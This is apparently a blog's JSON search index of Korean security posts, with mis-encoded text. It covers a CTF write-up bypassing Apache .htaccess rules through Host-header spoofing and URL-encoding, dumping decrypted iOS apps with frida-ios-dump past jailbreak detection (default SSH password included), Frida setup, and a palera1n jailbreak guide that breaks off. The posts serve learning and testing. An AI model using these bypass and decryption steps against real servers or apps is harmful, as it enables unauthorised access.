[
  
  {
    "title": "[Urmia CTF 2023] htaccess(helicoptering) writeup",
    "url": "/posts/urmia-ctf-htaccess/",
    "categories": "WEB",
    "tags": "ctf, web, apache",
    "date": "2023-09-03 11:01:00 +0900",
    





    
    "snippet": "solveë‘ê°œì˜ .htaccess ë¥¼ ìš°íšŒí•˜ë©´ flagë¥¼ íšë“í•  ìˆ˜ ìˆë‹¤.$ curl http://htaccess.uctf.ir/one/flag.txt&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/ti...",
    "content": "solveë‘ê°œì˜ .htaccess ë¥¼ ìš°íšŒí•˜ë©´ flagë¥¼ íšë“í•  ìˆ˜ ìˆë‹¤.$ curl http://htaccess.uctf.ir/one/flag.txt&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Forbidden&lt;/h1&gt;&lt;p&gt;You don't have permission to access this resource.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;ë§Œì•½ ìš°íšŒí•˜ì§€ ì•Šê³  ì ‘ê·¼í•œë‹¤ë©´ 403ì„ ë°˜í™˜í•œë‹¤.RewriteEngine OnRewriteCond %{HTTP_HOST} !^localhost$RewriteRule \".*\" \"-\" [F]ì²« ë²ˆì§¸ .htaccess ëŠ” HTTP_HOSTê°€ localhostì¸ì§€ í™•ì¸í•œë‹¤.$ curl -H 'Host: localhost' http://htaccess.uctf.ir/one/flag.txtuctf{Sule_%ìš”ì²­í•  ë•Œ í—¤ë”ì— Hostë¥¼ ë°”ê¿”ì£¼ë©´ í†µê³¼ëœë‹¤.RewriteEngine OnRewriteCond %{THE_REQUEST} flagRewriteRule \".*\" \"-\" [F]ë‘ ë²ˆì§¸ .htaccess ëŠ” THE_REQUEST ë³€ìˆ˜ì— flagê°€ ì¡´ì¬í•˜ëŠ”ì§€ ê²€ì‚¬í•œë‹¤.THE_REQUEST    The full HTTP request line sent by the browser to the server (e.g., \"GET /index.html HTTP/1.1\"). This does not include any additional headers sent by the browser. This value has not been unescaped (decoded), unlike most other variables below.documentationì— ì˜í•˜ë©´ request path ë¶€ë¶„(GET /path HTTP/1.1)ì´ THE_REQUEST ë³€ìˆ˜ì— í•´ë‹¹í•˜ëŠ” ê²ƒìœ¼ë¡œ ë³´ì¸ë‹¤. ë˜í•œ, decoded textë¼ê³  í•˜ë‹ˆ, flag ë¶€ë¶„ì„ url encode í•´ì£¼ë©´ ë  ê²ƒ ê°™ë‹¤.$ curl http://htaccess.uctf.ir/two/%66lag.txtDukol_waterfall}%f ë¶€ë¶„ë§Œ %66ìœ¼ë¡œ ë°”ê¿”ì„œ ìš”ì²­í•´ì£¼ë©´ ë‚˜ë¨¸ì§€ í”Œë˜ê·¸ë¥¼ íšë“í•  ìˆ˜ ìˆë‹¤.uctf{Sule_Dukol_waterfall}ref.apache documentation"
  },
  
  {
    "title": "[MacOS] Apple Silicon ë§¥ë¶ì—ì„œ amd64 ì‚¬ìš©í•˜ê¸°(UTM)",
    "url": "/posts/use-amd64-on-apple-silicon/",
    "categories": "PWNABLE",
    "tags": "macos, qemu, utm",
    "date": "2023-08-01 01:01:00 +0900",
    





    
    "snippet": "Why?  ë§ì€ ë³´ì•ˆì¸ë“¤ì´ ì•Œê³  ìˆë“¯ì´ Apple Siliconì€ í¬ë„ˆë¸”ì„ í•˜ê¸°ì— ì°¸ ì í•©í•˜ì§€ê°€ ì•Šë‹¤. ì—…ë¬´ë¥¼ ë³´ë‹¤ë³´ë©´ í•„íˆ x86 ë°”ì´ë„ˆë¦¬ë¥¼ ë‹¤ë¤„ì•¼ í•˜ëŠ”ë°, Apple Siliconì€ ARM êµ¬ì¡°ë¥¼ ì‚¬ìš©í•˜ê³  ìˆê¸° ë•Œë¬¸ì— ì œì•½ì´ ìƒê¸´ë‹¤. ì´ì— ëŒ€í•œ í•´ê²° ë°©ì•ˆìœ¼ë¡œ amd64 ubuntu ë„ì»¤ë¥¼ ë°›ê³  ì—¬ê¸°ì— ë¶„ì„ ë„êµ¬ë¥¼ ì„¸íŒ…í•˜ëŠ” ì‚¬ìš©ìê°€ ë§ë‹¤. í•˜ì§€ë§Œ ì´...",
    "content": "Why?  ë§ì€ ë³´ì•ˆì¸ë“¤ì´ ì•Œê³  ìˆë“¯ì´ Apple Siliconì€ í¬ë„ˆë¸”ì„ í•˜ê¸°ì— ì°¸ ì í•©í•˜ì§€ê°€ ì•Šë‹¤. ì—…ë¬´ë¥¼ ë³´ë‹¤ë³´ë©´ í•„íˆ x86 ë°”ì´ë„ˆë¦¬ë¥¼ ë‹¤ë¤„ì•¼ í•˜ëŠ”ë°, Apple Siliconì€ ARM êµ¬ì¡°ë¥¼ ì‚¬ìš©í•˜ê³  ìˆê¸° ë•Œë¬¸ì— ì œì•½ì´ ìƒê¸´ë‹¤. ì´ì— ëŒ€í•œ í•´ê²° ë°©ì•ˆìœ¼ë¡œ amd64 ubuntu ë„ì»¤ë¥¼ ë°›ê³  ì—¬ê¸°ì— ë¶„ì„ ë„êµ¬ë¥¼ ì„¸íŒ…í•˜ëŠ” ì‚¬ìš©ìê°€ ë§ë‹¤. í•˜ì§€ë§Œ ì´ ë°©ë²•ì€ pwndbgê°€ ë™ì‘í•˜ì§€ ì•ŠëŠ” ë“± ì•„ì§ê¹Œì§€ëŠ” ì™„ì „íˆ amd64ë¥¼ ëŒ€ì²´í•  ë§Œí•œ ìˆ˜ë‹¨ì€ ì•„ë‹Œ ê²ƒ ê°™ë‹¤. ì´ ë•Œë¬¸ì— ì¡°ê¸ˆ ë¬´ê²ë”ë¼ë„ UTMì„ ì´ìš©í•˜ì—¬ amd64 ubuntu í™˜ê²½ì„ êµ¬ì¶•í•˜ê³ ì í•œë‹¤.UTM ì„¤ì¹˜      UTMì€ QEMU ê¸°ë°˜ì˜ ì—ë®¬ë ˆì´í„°ì´ë‹¤. iOS, MacOS ì—ì„œ ë‹¤ë¥¸ OSë¥¼ full system emulation í•  ìˆ˜ ìˆë‹¤.        ì„¤ì¹˜ëŠ” ê¹ƒí—ˆë¸Œ ì—ì„œ UTM.dmgë¥¼ ë°›ì•„ì„œ ì§„í–‰í•  ìˆ˜ ìˆë‹¤.        ì„¤ì¹˜ í›„ì—ëŠ” ì•„ë˜ì™€ ê°™ì€ í™”ë©´ì„ ë³¼ ìˆ˜ ìˆë‹¤.  ìƒˆ ê°€ìƒë¨¸ì‹  ë§Œë“¤ê¸°  ë³¸ ê¸€ì—ì„œëŠ” Ubuntu 22.04 Server(CLI)ë¥¼ ì„¤ì¹˜í•  ê²ƒì´ë‹¤.  Ubuntu 22.04ì˜ iso íŒŒì¼ì„ ë‹¤ìš´ë¡œë“œ ë°›ìœ¼ë©´ ëœë‹¤. AMD64ë¡œ ë°›ì•„ì£¼ë©´ ëœë‹¤. (ë‹¤ìš´ë¡œë“œ)  UTMì—ì„œ â€œìƒˆ ê°€ìƒë¨¸ì‹  ë§Œë“¤ê¸°â€ ë¥¼ ì„ íƒí•˜ë©´ Virtualizeì™€ EmulateÂ ë‘ê°€ì§€ ì˜µì…˜ì´ ìˆë‹¤. VirtualizeëŠ” Parallels, VMWareì™€ ê°™ì´ ê°€ìƒë¨¸ì‹ ì„ ê°€ìƒí™” í•˜ëŠ”ê²ƒìœ¼ë¡œ, í˜¸ìŠ¤íŠ¸ì˜ CPU ì•„í‚¤í…ì²˜ë§Œ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤. ì´ì™€ ë°˜ëŒ€ë¡œ EmulateëŠ” ë„¤ì´í‹°ë¸Œ CPU ì•„í‚¤í…ì²˜ê°€ ì•„ë‹Œ ë‹¤ë¥¸ ê²ƒë“¤ì„ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤. ê·¸ ëŒ€ì‹  CPU ê·¸ ìì²´ë¥¼ ì—ë®¬ë ˆì´íŒ… í•˜ëŠ” ê²ƒì´ê¸° ë•Œë¬¸ì— ì†ë„ê°€ ëŠë¦´ ìˆ˜ ìˆë‹¤. ë³¸ ê¸€ì˜ ê²½ìš° ëŠë¦¬ë”ë¼ë„ amd64ë¥¼ ë„¤ì´í‹°ë¸Œ ì²˜ëŸ¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ëª©ì ì´ê¸° ë•Œë¬¸ì— Emulateë¥¼ ì„ íƒí•œë‹¤.  ê·¸ ë‹¤ìŒìœ¼ë¡œ ìš´ì˜ì²´ì œëŠ” Linuxë¥¼ ì„ íƒí•œë‹¤. ê·¸ ë‹¤ìŒ í™”ë©´ì—ì„œ â€œíƒìƒ‰â€ ì„ ëˆŒëŸ¬ ë°©ê¸ˆ ë‹¤ìš´ë¡œë“œ ë°›ì€ ISO íŒŒì¼ì˜ ê²½ë¡œë¥¼ ì„ íƒí•´ì¤€ë‹¤.  ì•„í‚¤í…ì²˜ì™€ ë©”ëª¨ë¦¬, CPU ì½”ì–´ ìˆ˜ë¥¼ ì„ íƒí•´ì¤€ë‹¤. ì•„í‚¤í…ì²˜ëŠ” x86_64ë¡œ í•˜ê³ , ë©”ëª¨ë¦¬ì™€ CPUëŠ” ë³¸ì¸ ì‚¬ì–‘ì„ ê³ ë ¤í•˜ì—¬ ì ì ˆíˆ ì¡°ì ˆí•œë‹¤. ì €ì¥ ê³µê°„ë„ ë§ˆì°¬ê°€ì§€ì´ë‹¤.  ê³µìœ  í´ë”ëŠ” ì„ íƒì‚¬í•­ì´ë‚˜, ë³¸ ê¸€ì—ì„œëŠ” ~/utm ë””ë ‰í† ë¦¬ë¥¼ ë§Œë“¤ê³  ê³µìœ  í´ë”ë¡œ ì§€ì •í•˜ì˜€ë‹¤. ë°”ì´ë„ˆë¦¬ë¥¼ ì˜®ê¸°ê±°ë‚˜ í• ë•Œ ì¼ì¼íˆ SCPë¥¼ ì“´ë‹¤ê±°ë‚˜ í•˜ë©´ ë¶ˆí¸í•˜ê¸° ë•Œë¬¸ì— ì›¬ë§Œí•˜ë©´ ì„¤ì •í•´ì£¼ì.  ê°€ìƒ ë¨¸ì‹  ì´ë¦„ì„ ì„¤ì •í•´ì¤€ë‹¤.  ìµœì¢…ì ìœ¼ë¡œ ë‹¤ìŒê³¼ ê°™ì€ í™”ë©´ì´ ë‚˜ì˜¤ê²Œ ë˜ëŠ”ë°, ì´ ì´í›„ëŠ” ê·¸ëƒ¥ Ubuntu ì„¤ì¹˜í•˜ë“¯ì´ ì„¤ì¹˜í•˜ë©´ ëœë‹¤.  ì„¤ì¹˜ê°€ ì™„ë£Œë˜ë©´ CD/DVDë¥¼ ì´ˆê¸°í™” í•œ í›„ ì‹¤í–‰í•œë‹¤. ìµìˆ™í•œ Ubuntuë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤. SSH ë“± í¸í•œ ë°©ë²•ìœ¼ë¡œ ì ‘ê·¼í•˜ì—¬ ì‚¬ìš©í•˜ë©´ ëœë‹¤.  ì•„í‚¤í…ì²˜ë¥¼ í™•ì¸í•´ë³´ë©´ x86_64ì¸ ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.ì œì•½ ì‚¬í•­ì´ ìˆëŠ”ì§€ í™•ì¸í•´ë³´ê¸°  ë‹¤ë¥¸ ê°€ìƒí™” í”„ë¡œê·¸ë¨ì„ ì´ìš©í•˜ë©´ pwndbgê°€ ë˜ì§€ ì•Šì•˜ëŠ”ë°, ì •ìƒì ìœ¼ë¡œ ë™ì‘í•˜ê³  x86 ë°”ì´ë„ˆë¦¬ë„ ì˜ ì‹¤í–‰ ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.Ref.https://dev.to/ruanbekker/how-to-run-a-amd64-bit-linux-vm-on-a-mac-m1-51cp"
  },
  
  {
    "title": "[iOS] iOS-Encrypted ëœ IPA ë³µí˜¸í™”í•˜ê¸°",
    "url": "/posts/ios-ipa-dump-frida/",
    "categories": "MOBILE, IOS",
    "tags": "mobile, ios, firda",
    "date": "2023-03-04 01:03:00 +0900",
    





    
    "snippet": "Why?  ìµœê·¼ ë§¡ì€ í”„ë¡œì íŠ¸ì—ì„œ iOS ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ë¶„ì„í•  ì¼ì´ ìƒê²¼ë‹¤. ì ì  í•˜ë‹¤ë³´ë‹ˆ ì™œ ì• í”Œì´ ìê¸°ë„¤ë“¤ ì œí’ˆ/ì†”ë£¨ì…˜ì— ì–´ë§ˆì–´ë§ˆí•œ ë°”ìš´í‹°ë¥¼ ê±¸ì—ˆëŠ”ì§€ ì•Œ ê²ƒ ê°™ë‹¤. ê·¸ëƒ¥ ê°„ë‹¨í•œ ì• í”Œë¦¬ì¼€ì´ì…˜ ì¶”ì¶œ ê³¼ì •ë„ ë²ˆê±°ë¡­ê³  ë²ˆê±°ë¡­ë‹¤â€¦ iOS ì• í”Œë¦¬ì¼€ì´ì…˜ íŒ¨í‚¤ì§€ì¸ IPAëŠ” ì•ˆë“œë¡œì´ë“œ APKì™€ ë‹¤ë¥´ê²Œ ë°”ë¡œ ì¶”ì¶œí•œ íŒŒì¼ì„ Decompile í–ˆì„ ë•Œ ë¶„ì„ì„ í•  ìˆ˜ ì—†...",
    "content": "Why?  ìµœê·¼ ë§¡ì€ í”„ë¡œì íŠ¸ì—ì„œ iOS ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ë¶„ì„í•  ì¼ì´ ìƒê²¼ë‹¤. ì ì  í•˜ë‹¤ë³´ë‹ˆ ì™œ ì• í”Œì´ ìê¸°ë„¤ë“¤ ì œí’ˆ/ì†”ë£¨ì…˜ì— ì–´ë§ˆì–´ë§ˆí•œ ë°”ìš´í‹°ë¥¼ ê±¸ì—ˆëŠ”ì§€ ì•Œ ê²ƒ ê°™ë‹¤. ê·¸ëƒ¥ ê°„ë‹¨í•œ ì• í”Œë¦¬ì¼€ì´ì…˜ ì¶”ì¶œ ê³¼ì •ë„ ë²ˆê±°ë¡­ê³  ë²ˆê±°ë¡­ë‹¤â€¦ iOS ì• í”Œë¦¬ì¼€ì´ì…˜ íŒ¨í‚¤ì§€ì¸ IPAëŠ” ì•ˆë“œë¡œì´ë“œ APKì™€ ë‹¤ë¥´ê²Œ ë°”ë¡œ ì¶”ì¶œí•œ íŒŒì¼ì„ Decompile í–ˆì„ ë•Œ ë¶„ì„ì„ í•  ìˆ˜ ì—†ê²Œ Instruction ë“¤ì„ ë­‰ê°œë†“ì•˜ë‹¤. ì´ë¥¼ í•´ì²´í•˜ëŠ” ì‘ì—…ì„ í•´ë³´ì.ê·¸ëƒ¥ ì¶”ì¶œí•˜ë©´?  ì•„ì‰½ê²Œë„ íƒˆì˜¥ ì—†ì´, ë¤í”„ ì—†ì´, ë³µí˜¸í™” ì—†ì´ëŠ” ìœ„ì™€ ê°™ì´ ë‹¤ ë­‰ê°œì§„ ë°”ì´ë„ˆë¦¬ë¥¼ ë˜ì ¸ì£¼ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.  ì• ì´ˆì— IDAì—ì„œ â€œì´ê±´ iOS Encrypted ë˜ì–´ìˆëŠ”ë° ê° ì¶˜?â€ ì´ë¼ê³  ë¬¼ì–´ë³¸ë‹¤.  fridaë¥¼ ì´ìš©í•´ì„œ ë³µí˜¸í™” ëœ IPAë¥¼ ë¤í”„í•´ë³´ìë¤í”„í•˜ê¸°0. ì‚¬ì „ ì‘ì—…  frida-ios-dumpë¥¼ ì´ìš©í•˜ê¸° ìœ„í•´ì„œëŠ” íƒˆì˜¥ê³¼ frida ì„¤ì¹˜ê°€ ì„ í–‰ë˜ì–´ì•¼ í•œë‹¤.1. frida-ios-dump ë° Dependency ì„¤ì¹˜$ git clone https://github.com/AloneMonkey/frida-ios-dump.git  Gitì—ì„œ frida-ios-dumpë¥¼ ë‚´ë ¤ë°›ë„ë¡ í•˜ì.$ cd frida-ios-dump/$ pip3 install -r requirements.txt  ì´í›„ í•´ë‹¹ repoë¥¼ ì´ìš©í•˜ê¸° ìœ„í•´ ì„¤ì¹˜í•´ì•¼ ë˜ëŠ” python íŒ¨í‚¤ì§€ë¥¼ ë‹¤ìš´ë¡œë“œ ë°›ì.2. dump.py ìˆ˜ì •User = 'root'Password = 'alpine'Host = 'localhost'Port = 2222KeyFileName = None  dump.py ë¥¼ ì—´ì–´ë³´ë©´ ìœ„ì™€ ê°™ì€ ì½”ë“œê°€ ìˆì„ ê²ƒì´ë‹¤.  ì´ëŠ” iPhoneì˜ SSH ì •ë³´ë¥¼ ì ëŠ” ê²ƒì´ë©°, ì•Œë§ê²Œ ìˆ˜ì •í•˜ë„ë¡ í•˜ì. (openssh-serverê°€ ì„¤ì¹˜ë˜ì–´ ìˆì–´ì•¼ í•œë‹¤.)3. ë¤í”„í•  Package Name í™•ì¸  frida-ps -Uai ë¥¼ í†µí•´ ë¤í”„í•  íŒ¨í‚¤ì§€ì˜ ì´ë¦„ì„ í™•ì¸í•˜ë„ë¡ í•˜ì.4. ë¤í”„í•˜ê¸°  python3 dump.py [íŒ¨í‚¤ì§€ ëª…] ì„ í†µí•´ ë¤í”„ë¥¼ ì§„í–‰í•´ì£¼ì.  ë‚˜ì˜ ê²½ìš° ëŒ€ìƒ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ íƒˆì˜¥ì„ íƒì§€í•˜ë©´ Splash ì´ë¯¸ì§€ë§Œ ë„ì›Œì£¼ê³  ë°”ë¡œ íŠ•ê¸°ëŠ” ì†”ë£¨ì…˜ì´ ê±¸ë ¤ìˆì—ˆê¸° ë•Œë¬¸ì— ëª‡ ê°€ì§€ ê¼¼ìˆ˜ë¥¼ ì´ìš©í•˜ì—¬ IPAê°€ ë©”ëª¨ë¦¬ì— ì˜¬ë¼ì˜¬ ë•Œ ê¹Œì§€ ê¸°ë‹¤ë¦¬ê²Œ ë§Œë“¤ì—ˆë‹¤.  ì¸ë‚´ì‹¬ì„ ê°€ì§€ê³  ì¡°ê¸ˆ ê¸°ë‹¤ë ¤ë³´ë©´ IPAë¥¼ í˜„ì¬ ë””ë ‰í† ë¦¬ì— ë§Œë“¤ì–´ì¤€ë‹¤.ê²°ê³¼ëŠ”?  ì•„ê¹Œì™€ ë‹¤ë¥´ê²Œ ì•„ì£¼ ê¹”ë”í•˜ê²Œ Decompile ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤."
  },
  
  {
    "title": "[iOS] iPhoneì— Frida í™˜ê²½ ì„¸íŒ…í•˜ê¸°",
    "url": "/posts/ios-setting-frida/",
    "categories": "MOBILE, IOS",
    "tags": "mobile, ios, firda",
    "date": "2023-03-04 01:02:00 +0900",
    





    
    "snippet": "Why?  ìµœê·¼ ë§¡ì€ í”„ë¡œì íŠ¸ì—ì„œ iOS ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ë¶„ì„í•  ì¼ì´ ìƒê²¼ë‹¤. ìš°ì—´ê³¡ì ˆ iOS íƒˆì˜¥ì„ ì™„ë£Œí–ˆê³ , ì´ì œ fridaë¥¼ ì„¸íŒ…í•´ë³´ë ¤ê³  í•œë‹¤.ë¶„ì„ í™˜ê²½ êµ¬ì„±í•˜ê¸°0. iPhone íƒˆì˜¥í•˜ê¸°  ì•„ë¬´ë˜ë„ fridaë¥¼ ì‚¬ìš©í•˜ë ¤ë©´ íƒˆì˜¥, ë£¨íŒ…ì´ í•„ìš”í•  ê²ƒì´ë‹¤. ë°”ë¡œ ì´ì „ ê¸€ì—ì„œ iOS íƒˆì˜¥ì— ëŒ€í•´ ë‹¤ë¤˜ìœ¼ë‹ˆ ì„ í–‰í•˜ë„ë¡ í•˜ì.1. MacBookì— frida-t...",
    "content": "Why?  ìµœê·¼ ë§¡ì€ í”„ë¡œì íŠ¸ì—ì„œ iOS ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ë¶„ì„í•  ì¼ì´ ìƒê²¼ë‹¤. ìš°ì—´ê³¡ì ˆ iOS íƒˆì˜¥ì„ ì™„ë£Œí–ˆê³ , ì´ì œ fridaë¥¼ ì„¸íŒ…í•´ë³´ë ¤ê³  í•œë‹¤.ë¶„ì„ í™˜ê²½ êµ¬ì„±í•˜ê¸°0. iPhone íƒˆì˜¥í•˜ê¸°  ì•„ë¬´ë˜ë„ fridaë¥¼ ì‚¬ìš©í•˜ë ¤ë©´ íƒˆì˜¥, ë£¨íŒ…ì´ í•„ìš”í•  ê²ƒì´ë‹¤. ë°”ë¡œ ì´ì „ ê¸€ì—ì„œ iOS íƒˆì˜¥ì— ëŒ€í•´ ë‹¤ë¤˜ìœ¼ë‹ˆ ì„ í–‰í•˜ë„ë¡ í•˜ì.1. MacBookì— frida-tools ì„¤ì¹˜í•˜ê¸°  í„°ë¯¸ë„ì„ ì—´ê³  pip3 install frida-tools ìœ¼ë¡œ frida-toolsë¥¼ ì„¤ì¹˜í•œë‹¤. ì´ëŠ” frida-ps, frida-trace ë“± ìœ ìš©í•œ ë„êµ¬ë“¤ì„ í¬í•¨í•œë‹¤.2. iPhoneì— frida ì„¤ì¹˜í•˜ê¸°  iPhoneì´ íƒˆì˜¥ë˜ì–´ ìˆë‹¤ë©´ Cydia, Sileo ë“± íƒˆì˜¥ëœ ê¸°ê¸°ì˜ íŒ¨í‚¤ì§€ ê´€ë¦¬ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ìˆì„ ê²ƒì´ë‹¤.  Sileo ì˜ ê²½ìš° [í•˜ë‹¨ ë„¤ë¹„ê²Œì´ì…˜] &gt; [ì†ŒìŠ¤] &gt; [ìš°ì¸¡ ìƒë‹¨ ë”í•˜ê¸°] ì—ì„œ ì†ŒìŠ¤ì¶”ê°€ë¥¼ í†µí•´ fridaì˜ repositoryì¸ https://build.frida.re/ ë¥¼ ì¶”ê°€í•´ì¤˜ì•¼ í•œë‹¤.  ì´ì œ [í•˜ë‹¨ ë‚´ë¹„ê²Œì´ì…˜] &gt; [ê²€ìƒ‰] &gt; [â€˜Fridaâ€™ ê²€ìƒ‰] ì„ í†µí•´ Fridaë¥¼ ê¸°ê¸°ì— ì„¤ì¹˜í•œë‹¤.3. ê¸°ê¸°ë¥¼ MacBookì— ì—°ê²°í•˜ê³  frida attach  frida-ps -U ë¡œ usb ì—°ê²°ëœ ì¥ì¹˜ í”„ë¡œì„¸ìŠ¤ ëª©ë¡ì„ ì¶œë ¥í•´ë³´ì."
  },
  
  {
    "title": "[iOS] iOS 16.3.1 Jailbreak (on MacOS)",
    "url": "/posts/ios-jailbreak-16/",
    "categories": "MOBILE, IOS",
    "tags": "mobile, ios, jailbreak",
    "date": "2023-03-04 01:01:00 +0900",
    





    
    "snippet": "Why?  ìµœê·¼ ë§¡ì€ í”„ë¡œì íŠ¸ì—ì„œ iOS ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ë¶„ì„í•  ì¼ì´ ìƒê²¼ë‹¤. APKì˜ ê²½ìš° ëŒ€ì¶© ì‹œì¤‘ì— ë„ë ¤ìˆëŠ” ì—ë®¬ë ˆì´í„° ê°€ì ¸ë‹¤ê°€ (ì–´ì°¨í”¼ ë£¨íŒ… ì†ì‰½ê²Œ í•  ìˆ˜ ìˆìœ¼ë‹ˆê¹ ë²„íŠ¼ í•˜ë‚˜ë¡œ) frida ì„¤ì¹˜í•˜ê³  í›„í‚¹ ëŒë¦¬ë©´ì„œ ë¶„ì„í•˜ë©´ ë˜ëŠ”ë° iOSëŠ” ê·¸ë ‡ê²Œ ê°„ë‹¨í•œ ë¬¸ì œê°€ ì•„ë‹ˆë”ë¼. ëŒ€ì¶© ë²ˆê°œì¥í„°ì—ì„œ ì•„ë¬´ íœ´ëŒ€í°ì´ë‚˜ ì‚¬ì„œ ë‹¤ìš´ê·¸ë ˆì´ë“œ í•œ ë‹¤ìŒì— íƒˆì˜¥ì‹œí‚¤ë©´ ë˜ëŠ”...",
    "content": "Why?  ìµœê·¼ ë§¡ì€ í”„ë¡œì íŠ¸ì—ì„œ iOS ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ë¶„ì„í•  ì¼ì´ ìƒê²¼ë‹¤. APKì˜ ê²½ìš° ëŒ€ì¶© ì‹œì¤‘ì— ë„ë ¤ìˆëŠ” ì—ë®¬ë ˆì´í„° ê°€ì ¸ë‹¤ê°€ (ì–´ì°¨í”¼ ë£¨íŒ… ì†ì‰½ê²Œ í•  ìˆ˜ ìˆìœ¼ë‹ˆê¹ ë²„íŠ¼ í•˜ë‚˜ë¡œ) frida ì„¤ì¹˜í•˜ê³  í›„í‚¹ ëŒë¦¬ë©´ì„œ ë¶„ì„í•˜ë©´ ë˜ëŠ”ë° iOSëŠ” ê·¸ë ‡ê²Œ ê°„ë‹¨í•œ ë¬¸ì œê°€ ì•„ë‹ˆë”ë¼. ëŒ€ì¶© ë²ˆê°œì¥í„°ì—ì„œ ì•„ë¬´ íœ´ëŒ€í°ì´ë‚˜ ì‚¬ì„œ ë‹¤ìš´ê·¸ë ˆì´ë“œ í•œ ë‹¤ìŒì— íƒˆì˜¥ì‹œí‚¤ë©´ ë˜ëŠ”ì¤„ ì•Œì•˜ë‹¤. ê·¸ëŸ°ë° ë§‰ìƒ ì¤‘ê³ ë¡œ ì‚° í•¸ë“œí°ì€ ìµœì‹  ì—…ë°ì´íŠ¸ ë˜ì–´ìˆì—ˆê³ , Sign ì—†ëŠ” ë²„ì „ì€ ì„¤ì¹˜ ì•ˆë˜ëŠ” ë¬¸ì œ ë“±ë“± ì´ë¦¬ì €ë¦¬ ì¹˜ì´ë‹¤ê°€ ê·¸ëƒ¥ ê°€ì¥ ìµœì‹ ì¸ iOS 16.3 ì—ì„œ íƒˆì˜¥í•˜ëŠ” ë°©ë²•ì„ íƒí–ˆë‹¤.ë‚´ ê¸°ê¸°ë„ ê°€ëŠ¥í• ê¹Œ?ê°œë°œìì— ì˜í•˜ë©´ A8 ë¶€í„° A11 ì¹©ì…‹ì„ ì‚¬ìš©í•˜ëŠ” ëª¨ë¸ê¹Œì§€ ê°€ëŠ¥í•˜ë‹¤ê³  í•œë‹¤. í˜¸í™˜ë˜ëŠ” ê¸°ê¸° ëª©ë¡ì€ ì•„ë˜ì™€ ê°™ë‹¤.  iPhone 6s  iPhone 6s Plus  iPhone SE (2016)  iPhone 7  iPhone 7 Plus  iPhone 8  iPhone 8 Plus  iPhone X  iPad mini 4  iPad Air 2  iPad (5th generation)  iPad (6th generation)  iPad (7th generation)  iPad Pro (9.7â€)  iPad Pro (12.9â€) (1st generation)  iPad Pro (10.5â€)  iPad Pro (12.9â€) (2nd generation)  iPod Touch (7th generation)í™˜ê²½íƒˆì˜¥ ëŒ€ìƒ ê¸°ê¸° ìŠ¤í™ì€ ë‹¤ìŒê³¼ ê°™ë‹¤.  ê¸°ê¸° : iPhone 8  ëª¨ë¸ ë²ˆí˜¸ : A1905(iPhone 8 GMS)  ë²„ì „ : iOS 16.3.1MacOS ìŠ¤í™ì€ ë‹¤ìŒê³¼ ê°™ë‹¤.  ê¸°ê¸° : MacBook Air(M1, 2020)  ëª¨ë¸ ë²ˆí˜¸ : A2337  ë²„ì „ : macOS Ventura 13.0íƒˆì˜¥ ê³¼ì •1. palera1n ë‹¤ìš´ë¡œë“œpalera1n github repository ì—ì„œ macos-universal ë°”ì´ë„ˆë¦¬ë¥¼ ë‹¤ìš´ë¡œë“œ ë°›ëŠ”ë‹¤.2. ë°”ì´ë„ˆë¦¬ ê¶Œí•œ ë¶€ì—¬ë‹¤ìš´ë°›ì€ ë°”ì´ë„ˆë¦¬ì— Execute Permissionì„ ë¶€ì—¬í•˜ë„ë¡ í•˜ì.$ sudo mv ./palera1n-macos-universal /usr/local/bin/palera1n$ ls -al /usr/local/bin/palera1n-rw-r--r--@ 1 r99bbit  staff  15559360  3  4 00:24 /usr/local/bin/palera1n$ sudo xattr -cr /usr/local/bin/palera1n$ sudo chmod +x /usr/local/bin/palera1n-rwxr-xr-x  1 r99bbit  staff  15559360  3  4 00:24 /usr/local/bin/palera1n3. iPhoneì„ ì´ˆê¸°í™”í•˜ê¸°A11 ì¹©ì…‹ì´ íƒ‘ì¬ëœ ê¸°ê¸°ì—ì„œ iOS 16.x ë¥¼ ì‚¬ìš©ì¤‘ì¼ ê²½ìš° íƒˆì˜¥ì„ ìœ„í•´ì„œëŠ” ì•”í˜¸ë¥¼ ì„¤ì •í•œ ì ì´ ì—†ì–´ì•¼ í•œë‹¤. ë§Œì•½ í•œë²ˆì´ë¼ë„ TouchID, passcodeë¥¼ ì ìš©í•œ ì ì´ ìˆë‹¤ë©´ iPhoneì—ì„œ ì„¤ì • &gt; ì¼ë°˜ &gt; ì „ì†¡ ë˜ëŠ” iPhone ì¬ì„¤ì • &gt; ëª¨ë“  ì½˜í…ì¸  ë° ì„¤ì • ì§€ìš°ê¸°ë¥¼ í†µí•´ ì™„ì „ ì´ˆê¸°í™”ë¥¼ ì§„í–‰í•´ì¤˜ì•¼ í•œë‹¤. (ì‘ì—… ì§„í–‰ ì „ì— iTunes ë“±ìœ¼ë¡œ iPhoneì„ ë°±ì—…í•˜ë„ë¡ í•˜ì)iPhone 8 ì‹œë¦¬ì¦ˆì˜ ê²½ìš° A11 ë°”ì´ì˜¤ë‹‰ ì¹©ì…‹ì´ íƒ‘ì¬ë˜ì–´ ìˆê¸° ë•Œë¬¸ì— ìƒê¸° ë°©ë²•ìœ¼ë¡œ ì´ˆê¸°í™”ë¥¼ ì§„í–‰í•˜ì˜€ë‹¤.4. iPhoneì„ MacBookì— ì—°ê²°í•˜ê¸°iPhoneì„ 